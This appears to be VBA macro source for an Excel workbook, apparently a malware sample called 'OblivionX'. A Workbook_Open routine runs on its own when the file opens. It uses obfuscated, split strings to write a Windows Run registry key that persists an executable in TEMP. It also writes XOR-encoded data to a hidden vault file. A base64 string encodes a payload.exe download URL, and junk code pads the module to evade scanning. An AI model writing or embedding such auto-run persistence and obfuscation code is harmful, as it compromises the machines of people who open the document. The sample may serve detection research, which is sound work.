
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As Object
    Dim bwt1msm67xb As String, data As String, enc As String
    Dim pj16ga84d1wp As Long
    Set frs0swbone = CreateObject(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & "Shell")
    frs0swbone.RegWrite "HKCU" & "\Soft" & "ware\Micr" & "osoft\" & "Wind" & "ows\Curre" & "ntVe" & "rsion\Ru" & "n\obli" & "vionx", """ & Environ("TEMP") & "\oblivion" & "x_loc" & "k.exe"", "REG_SZ"
    bwt1msm67xb = Environ("TEMP") & "\obli" & "vionx_va" & "ult\" & "secret.t" & "xt"
    data = "top se" & "cret " & "mark" & "er d" & "ata"
    enc = ""
    For pj16ga84d1wp = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, pj16ga84d1wp, 1)) Xor 42)
    Next pj16ga84d1wp
    Open bwt1msm67xb For Output As #1
    Print #1, enc
    Close #1
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
